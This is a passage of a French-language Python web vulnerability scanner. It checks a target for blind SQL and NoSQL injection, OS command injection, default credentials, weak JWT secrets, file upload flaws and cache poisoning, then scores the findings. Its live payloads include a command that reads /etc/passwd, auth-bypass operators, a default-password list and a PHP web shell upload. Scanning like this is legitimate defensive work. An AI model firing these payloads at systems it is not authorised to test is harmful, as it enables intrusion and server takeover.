            "/api/", "/api/v1/", "/api/v2/", "/api/users", "/api/admin",
            "/swagger.json", "/swagger-ui.html", "/openapi.json", "/api-docs",
            "/graphql", "/graphql/playground", "/graphiql",
            "/actuator", "/actuator/health", "/actuator/env",
            "/.well-known/openid-configuration",
        ]
        for path in api_paths:
            url = self.target_url + path
            r = self._get(url)
            if not r or r.status_code not in (200, 401):
                continue
            ct = r.headers.get("Content-Type", "")
            if "json" in ct or "graphql" in ct or r.status_code == 401:
                self.add_vulnerability(
                    "Endpoint API exposé",
                    f"Un endpoint API est accessible : '{path}' (status {r.status_code})",
                    "medium" if r.status_code == 200 else "low",
                    5.3 if r.status_code == 200 else 3.5,
                    "Sécuriser les endpoints API avec authentification JWT/OAuth et restreindre l'accès non autorisé",
                    endpoint=url
                )

        # GraphQL introspection
        r = self._post(self.target_url + "/graphql",
                       json={"query": "{__schema{types{name}}}"})
        if r and r.status_code == 200 and "__schema" in r.text:
            self.add_vulnerability(
                "GraphQL Introspection activée",
                "L'introspection GraphQL est activée en production — l'attaquant peut cartographier toute l'API.",
                "medium", 5.3,
                "Désactiver l'introspection GraphQL en production"
            )

    # =========================================================
    # 25. SQL INJECTION AVEUGLE (Blind SQLi)
    # =========================================================

    def check_sqli_blind(self):
        """Time-based et boolean-based blind SQL injection."""
        import time
        test_params = ["id", "user", "item", "product", "page", "q", "search", "category"]

        # Boolean-based
        bool_pairs = [
            ("1 AND 1=1", "1 AND 1=2"),
            ("1' AND '1'='1", "1' AND '1'='2"),
        ]
        for param in test_params:
            for true_p, false_p in bool_pairs:
                r_true  = self._get(self.target_url, params={param: true_p})
                r_false = self._get(self.target_url, params={param: false_p})
                if r_true and r_false:
                    if abs(len(r_true.text) - len(r_false.text)) > 50:
                        self.add_vulnerability(
                            "SQL Injection Aveugle (Boolean-based)",
                            f"Le paramètre '{param}' réagit différemment selon la condition SQL — injection aveugle possible.",
                            "critical", 9.8,
                            "Utiliser des requêtes préparées (parameterized queries)",
                            endpoint=f"{self.target_url}?{param}={quote(true_p)}"
                        )
                        return

        # Time-based (MySQL/PostgreSQL/SQLite)
        time_payloads = [
            ("id", "1' AND SLEEP(3)--"),
            ("id", "1; WAITFOR DELAY '0:0:3'--"),
            ("id", "1' AND (SELECT * FROM (SELECT(SLEEP(3)))a)--"),
        ]
        for param, payload in time_payloads:
            start = time.time()
            self._get(self.target_url, params={param: payload})
            elapsed = time.time() - start
            if elapsed >= 2.5:
                self.add_vulnerability(
                    "SQL Injection Aveugle (Time-based)",
                    f"Le paramètre '{param}' provoque un délai avec SLEEP() — injection SQL aveugle confirmée.",
                    "critical", 9.8,
                    "Utiliser des requêtes préparées et un ORM sécurisé",
                    endpoint=f"{self.target_url}?{param}={quote(payload)}"
                )
                return

    # =========================================================
    # 26. NoSQL INJECTION
    # =========================================================

    def check_nosql_injection(self):
        """Test injection NoSQL (MongoDB, etc.)."""
        # Via JSON body
        nosql_payloads = [
            {"username": {"$gt": ""}, "password": {"$gt": ""}},
            {"username": {"$ne": "invalid"}, "password": {"$ne": "invalid"}},
            {"username": {"$regex": ".*"}, "password": {"$regex": ".*"}},
        ]
        login_paths = ["/login", "/api/login", "/auth/login", "/api/auth", "/signin"]
        for path in login_paths:
            url = self.target_url + path
            r_normal = self._post(url, json={"username": "wrong", "password": "wrong"})
            if not r_normal or r_normal.status_code not in (200, 401, 403, 422):
                continue
            for payload in nosql_payloads:
                r = self._post(url, json=payload)
                if r and r.status_code == 200:
                    content = r.text.lower()
                    if any(kw in content for kw in ["token", "success", "welcome", "dashboard", "logged"]):
                        self.add_vulnerability(
                            "NoSQL Injection",
                            f"L'endpoint '{path}' est vulnérable à l'injection NoSQL — contournement d'authentification possible.",
                            "critical", 9.8,
                            "Valider et sanitiser toutes les entrées avant de les passer au moteur NoSQL",
                            endpoint=url
                        )
                        return

        # Via query params
        for param in ["filter", "where", "query", "search"]:
            for payload in ['{"$gt":""}', '{"$ne":null}']:
                r = self._get(self.target_url, params={param: payload})
                if r and r.status_code == 200 and len(r.text) > 200:
                    self.add_vulnerability(
                        "NoSQL Injection (paramètre GET)",
                        f"Le paramètre '{param}' accepte des opérateurs NoSQL sans filtrage.",
                        "high", 8.5,
                        "Interdire les opérateurs MongoDB ($gt, $ne, $regex...) dans les entrées utilisateur",
                        endpoint=f"{self.target_url}?{param}={quote(payload)}"
                    )
                    return

    # =========================================================
    # 27. COMMAND INJECTION
    # =========================================================

    def check_command_injection(self):
        """Détection d'injection de commandes OS."""
        payloads_and_markers = [
            ("; echo CMDINJECTED",    "CMDINJECTED"),
            ("| echo CMDINJECTED",    "CMDINJECTED"),
            ("& echo CMDINJECTED",    "CMDINJECTED"),
            ("`echo CMDINJECTED`",    "CMDINJECTED"),
            ("$(echo CMDINJECTED)",   "CMDINJECTED"),
            ("; sleep 3",             None),
            ("| cat /etc/passwd",     "root:x:"),
            ("& type C:\\Windows\\win.ini", "[fonts]"),
        ]
        test_params = ["cmd", "exec", "command", "run", "ping", "host", "ip",
                       "url", "file", "path", "name", "input", "query"]
        import time
        for param in test_params:
            for payload, marker in payloads_and_markers:
                if marker is None:
                    start = time.time()
                    r = self._get(self.target_url, params={param: payload})
                    if time.time() - start >= 2.5:
                        self.add_vulnerability(
                            "Command Injection (Time-based)",
                            f"Le paramètre '{param}' provoque un délai avec sleep — injection de commande confirmée.",
                            "critical", 10.0,
                            "Ne jamais passer des entrées utilisateur à des fonctions exec/system. Utiliser des listes blanches.",
                            endpoint=f"{self.target_url}?{param}={quote(payload)}"
                        )
                        return
                else:
                    r = self._get(self.target_url, params={param: payload})
                    if r and marker in r.text:
                        self.add_vulnerability(
                            "Command Injection (OS)",
                            f"Le paramètre '{param}' exécute des commandes système — accès complet au serveur possible.",
                            "critical", 10.0,
                            "Interdire l'exécution de commandes depuis les entrées utilisateur",
                            endpoint=f"{self.target_url}?{param}={quote(payload)}"
                        )
                        return

    # =========================================================
    # 28. CREDENTIALS PAR DÉFAUT
    # =========================================================

    def check_default_credentials(self):
        """Test des identifiants par défaut sur les panneaux d'administration."""
        default_creds = [
            ("admin",       "admin"),
            ("admin",       "password"),
            ("admin",       "123456"),
            ("admin",       "admin123"),
            ("admin",       ""),
            ("root",        "root"),
            ("root",        "toor"),
            ("root",        ""),
            ("administrator", "administrator"),
            ("test",        "test"),
            ("guest",       "guest"),
            ("user",        "user"),
        ]
        login_paths = ["/admin", "/wp-admin", "/login", "/admin/login",
                       "/api/login", "/auth/login", "/administrator"]
        for path in login_paths:
            url = self.target_url + path
            r = self._get(url)
            if not r or r.status_code not in (200, 302, 401):
                continue
            for username, password in default_creds:
                # Essai via formulaire
                r2 = self._post(url, data={"username": username, "password": password,
                                           "user": username, "pass": password,
                                           "email": username, "log": username, "pwd": password})
                if not r2:
                    continue
                content = r2.text.lower()
                if r2.status_code == 200 and any(
                    kw in content for kw in ["dashboard", "welcome", "logout", "admin panel", "signed in"]
                ):
                    self.add_vulnerability(
                        "Credentials par défaut acceptés",
                        f"Connexion réussie avec '{username}:{password}' sur '{path}'.",
                        "critical", 9.8,
                        "Changer immédiatement tous les mots de passe par défaut et forcer un mot de passe fort",
                        endpoint=url
                    )
                    return

    # =========================================================
    # 29. JWT WEAKNESSES
    # =========================================================

    def check_jwt_weaknesses(self):
        """Détection de JWT faibles ou mal configurés."""
        import base64

        r = self._get(self.target_url)
        if not r:
            return

        # Chercher JWT dans les headers, cookies et body
        jwt_pattern = re.compile(
            r'eyJ[A-Za-z0-9_\-]+\.eyJ[A-Za-z0-9_\-]+\.[A-Za-z0-9_\-]+'
        )
        sources = [r.text, str(r.headers), str(r.cookies)]
        jwt_token = None
        for source in sources:
            m = jwt_pattern.search(source)
            if m:
                jwt_token = m.group()
                break

        if not jwt_token:
            return

        parts = jwt_token.split(".")
        if len(parts) != 3:
            return

        # Décoder le header
        try:
            header_b64 = parts[0] + "=="
            header = json.loads(base64.urlsafe_b64decode(header_b64))
        except Exception:
            return

        alg = header.get("alg", "")

        # Algorithme "none"
        if alg.lower() == "none":
            self.add_vulnerability(
                "JWT — Algorithme 'none' accepté",
                "Le JWT utilise l'algorithme 'none' — signature ignorée, usurpation d'identité possible.",
                "critical", 9.8,
                "Rejeter les JWT avec alg='none'. Forcer HS256 ou RS256."
            )

        # Algorithme HS256 avec secret faible
        if alg in ("HS256", "HS384", "HS512"):
            weak_secrets = ["secret", "password", "123456", "admin", "key",
                            "jwt_secret", "changeme", "test", "supersecret"]
            import hmac, hashlib
            header_payload = f"{parts[0]}.{parts[1]}"
            expected_sig = parts[2]
            for secret in weak_secrets:
                sig = base64.urlsafe_b64encode(
                    hmac.new(secret.encode(), header_payload.encode(), hashlib.sha256).digest()
                ).rstrip(b"=").decode()
                if sig == expected_sig:
                    self.add_vulnerability(
                        "JWT — Secret faible",
                        f"Le JWT est signé avec le secret faible '{secret}' — falsification de token possible.",
                        "critical", 9.8,
                        "Utiliser un secret aléatoire de 256 bits minimum. Ne jamais utiliser des secrets prévisibles."
                    )
                    return

        # Expiration absente
        try:
            payload_b64 = parts[1] + "=="
            payload = json.loads(base64.urlsafe_b64decode(payload_b64))
            if "exp" not in payload:
                self.add_vulnerability(
                    "JWT — Pas d'expiration (exp)",
                    "Le JWT ne contient pas de date d'expiration — token valide indéfiniment.",
                    "high", 7.5,
                    "Toujours inclure le claim 'exp' dans les JWT (max 1h pour les tokens sensibles)"
                )
        except Exception:
            pass

    # =========================================================
    # 30. FILE UPLOAD VULNERABILITIES
    # =========================================================

    def check_file_upload(self):
        """Test des vulnérabilités d'upload de fichiers."""
        upload_paths = ["/upload", "/uploads", "/api/upload", "/file/upload",
                        "/media/upload", "/avatar", "/profile/picture", "/import"]
        dangerous_extensions = [
            ("shell.php",    b"<?php system($_GET['cmd']); ?>",     "application/x-php"),
            ("shell.php5",   b"<?php system($_GET['cmd']); ?>",     "application/x-php"),
            ("shell.phtml",  b"<?php system($_GET['cmd']); ?>",     "image/jpeg"),
            ("shell.asp",    b"<% Response.Write(\"hacked\") %>",   "text/plain"),
            ("shell.jsp",    b"<% out.println(\"hacked\"); %>",     "text/plain"),
            ("test.svg",     b'<svg xmlns="http://www.w3.org/2000/svg"><script>alert(1)</script></svg>', "image/svg+xml"),
        ]
        for path in upload_paths:
            url = self.target_url + path
            r = self._get(url)
            if not r or r.status_code not in (200, 405, 415):
                continue
            for fname, content, ctype in dangerous_extensions:
                files = {"file": (fname, content, ctype)}
                r2 = self._post(url, files=files)
                if r2 and r2.status_code in (200, 201):
                    resp_text = r2.text.lower()
                    if any(kw in resp_text for kw in ["success", "uploaded", "ok", fname.lower()]):
                        self.add_vulnerability(
                            "Upload de fichier dangereux accepté",
                            f"L'endpoint '{path}' accepte l'upload de '{fname}' — exécution de code possible.",
                            "critical", 9.9,
                            "Vérifier le type MIME réel, rejeter les extensions exécutables, stocker hors du webroot",
                            endpoint=url
                        )
                        return

    # =========================================================
    # 31. CLICKJACKING (test iframe réel)
    # =========================================================

    def check_clickjacking(self):
        """Vérifie si la page peut être intégrée dans une iframe."""
        r = self._get(self.target_url)
        if not r:
            return
        h = r.headers
        xfo = h.get("X-Frame-Options", "").upper()
        csp = h.get("Content-Security-Policy", "")

        frame_ancestors_blocked = "frame-ancestors" in csp.lower() and (
            "'none'" in csp.lower() or "'self'" in csp.lower()
        )
        xfo_blocked = xfo in ("DENY", "SAMEORIGIN")

        if not frame_ancestors_blocked and not xfo_blocked:
            self.add_vulnerability(
                "Clickjacking — Page intégrable en iframe",
                "Aucune protection X-Frame-Options ni CSP frame-ancestors — attaque Clickjacking possible.",
                "medium", 6.5,
                "Ajouter X-Frame-Options: DENY ou CSP: frame-ancestors 'none'"
            )

    # =========================================================
    # 32. SUBDOMAIN TAKEOVER
    # =========================================================

    def check_subdomain_takeover(self):
        """Détecte les indicateurs de subdomain takeover."""
        takeover_signatures = {
            "GitHub Pages":       ["There isn't a GitHub Pages site here"],
            "Heroku":             ["No such app", "herokucdn.com/error-pages"],
            "AWS S3":             ["NoSuchBucket", "The specified bucket does not exist"],
            "Azure":              ["404 Web Site not found"],
            "Shopify":            ["Sorry, this shop is currently unavailable"],
            "Fastly":             ["Fastly error: unknown domain"],
            "Pantheon":           ["The gods are wise", "pantheonsite.io"],
            "Tumblr":             ["There's nothing here"],
            "Ghost":              ["The thing you were looking for is no longer here"],
            "Surge.sh":           ["project not found"],
            "Netlify":            ["Not Found - Request ID"],
        }
        r = self._get(self.target_url)
        if not r:
            return
        content = r.text
        for service, signatures in takeover_signatures.items():
            if any(sig.lower() in content.lower() for sig in signatures):
                self.add_vulnerability(
                    f"Subdomain Takeover — {service}",
                    f"Le domaine pointe vers {service} mais le projet n'existe plus — takeover possible.",
                    "critical", 9.0,
                    f"Supprimer l'enregistrement DNS ou recréer le projet sur {service}"
                )
                return

    # =========================================================
    # 33. HTTP REQUEST SMUGGLING (indicateurs)
    # =========================================================

    def check_http_smuggling(self):
        """Détecte les indicateurs de HTTP Request Smuggling (CL.TE / TE.CL)."""
        try:
            # Test CL.TE basique
            payload = "POST / HTTP/1.1\r\nHost: {}\r\nContent-Length: 6\r\nTransfer-Encoding: chunked\r\n\r\n0\r\n\r\nX".format(
                urlparse(self.target_url).hostname
            )
            r = requests.post(
                self.target_url,
                data="0\r\n\r\nX",
                headers={
                    "Content-Length": "6",
                    "Transfer-Encoding": "chunked",
                    "Transfer-Encoding ": "chunked",
                },
                timeout=5,
                verify=False
            )
            if r and r.status_code in (200, 400, 500):
                if "invalid" in r.text.lower() or "bad request" in r.text.lower():
                    pass
                else:
                    self.add_vulnerability(
                        "HTTP Request Smuggling (indicateur détecté)",
                        "Le serveur accepte des requêtes avec des headers TE/CL ambigus — possible HTTP smuggling.",
                        "high", 8.0,
                        "Utiliser un proxy/load balancer qui rejette les requêtes avec des headers ambigus"
                    )
        except Exception:
            pass

    # =========================================================
    # 34. CACHE POISONING
    # =========================================================

    def check_cache_poisoning(self):
        """Test basique de cache poisoning via headers non-standard."""
        poison_headers = {
            "X-Forwarded-Host": "evil-cache-poison.com",
            "X-Host":           "evil-cache-poison.com",
            "X-Forwarded-Server": "evil-cache-poison.com",
        }
        for header, value in poison_headers.items():
            r = self._get(self.target_url, headers={header: value})
            if r and "evil-cache-poison.com" in r.text:
                self.add_vulnerability(
                    "Cache Poisoning — Header réfléchi",
                    f"Le header '{header}' est reflété dans la réponse — empoisonnement de cache possible.",
                    "high", 8.0,
                    "Ne pas utiliser les headers X-Forwarded-Host non validés dans les réponses",
                    endpoint=self.target_url
                )
                return

    # =========================================================
    # 35. HTTP PARAMETER POLLUTION
    # =========================================================

    def check_http_parameter_pollution(self):
        """Teste la pollution de paramètres HTTP (HPP)."""
        test_url = f"{self.target_url}?id=1&id=2"
        r1 = self._get(self.target_url, params={"id": "1"})
        r2 = self._get(test_url)
        if r1 and r2 and r1.status_code == 200 and r2.status_code == 200:
            if abs(len(r1.text) - len(r2.text)) > 100:
                self.add_vulnerability(
                    "HTTP Parameter Pollution (HPP)",
                    "Le serveur traite différemment les paramètres dupliqués — manipulation de logique possible.",
                    "medium", 5.3,
                    "Définir un comportement explicite pour les paramètres dupliqués (prendre le premier ou lever une erreur)"
                )

    # =========================================================
    # 36. WAF DETECTION
    # =========================================================

    def check_waf_detection(self):
        """Détecte la présence (ou l'absence) d'un WAF."""
        waf_signatures = {
            "Cloudflare":    ["cf-ray", "cloudflare", "__cfduid"],
            "AWS WAF":       ["x-amzn-requestid", "x-amz-cf-id"],
            "Sucuri":        ["x-sucuri-id", "sucuri"],
            "Imperva":       ["x-iinfo", "incapsula"],
            "Akamai":        ["akamai", "x-akamai"],
            "ModSecurity":   ["mod_security", "modsecurity"],
            "F5 BIG-IP":     ["bigipserver", "f5"],
        }
        r = self._get(self.target_url)
        if not r:
            return
        headers_str = str(r.headers).lower()
        body_lower = r.text[:1000].lower()
        detected = []
        for waf, sigs in waf_signatures.items():
            if any(s in headers_str or s in body_lower for s in sigs):
                detected.append(waf)

        if not detected:
            self.add_vulnerability(
                "Aucun WAF détecté",
                "Aucun Web Application Firewall n'a été détecté — les attaques ne sont pas filtrées.",
                "medium", 5.0,
                "Déployer un WAF (Cloudflare, AWS WAF, ModSecurity) pour filtrer les requêtes malveillantes"
            )

    # =========================================================
    # 37. CDN / INFRASTRUCTURE HEADERS
    # =========================================================

    def check_cdn_headers(self):
        """Vérifie les headers qui révèlent l'infrastructure interne."""
        r = self._get(self.target_url)
        if not r:
            return
        h = r.headers
        leaking_headers = {
            "X-Backend-Server":  "Serveur backend interne",
            "X-Served-By":       "Serveur de traitement",
            "X-Server-Name":     "Nom du serveur interne",
            "X-Real-IP":         "IP interne du serveur",
            "X-Forwarded-Server": "Serveur proxy interne",
            "Via":               "Proxy/cache intermédiaire",
            "X-Generator":       "Générateur CMS",
            "X-Drupal-Cache":    "Version Drupal",
            "X-Varnish":         "Version Varnish cache",
        }
        for header, desc in leaking_headers.items():
            val = h.get(header)
            if val:
                self.add_vulnerability(
                    f"Header d'infrastructure exposé : {header}",
                    f"Le header '{header}: {val}' révèle des informations sur l'infrastructure interne ({desc}).",
                    "low", 3.0,
                    f"Supprimer ou masquer le header '{header}' dans la configuration proxy/serveur"
                )

    # =========================================================
    # SCORE & SUMMARY
    # =========================================================

    def calculate_security_score(self):
        penalties = {"critical": 20, "high": 12, "medium": 6, "low": 2, "info": 0}
        score = 100
        for v in self.vulnerabilities:
            score -= penalties.get(v["severity"], 0)
        return max(0, score)

    def get_summary(self):
        s = {"critical": 0, "high": 0, "medium": 0, "low": 0, "info": 0}
        for v in self.vulnerabilities:
            if v["severity"] in s:
                s[v["severity"]] += 1
        return s
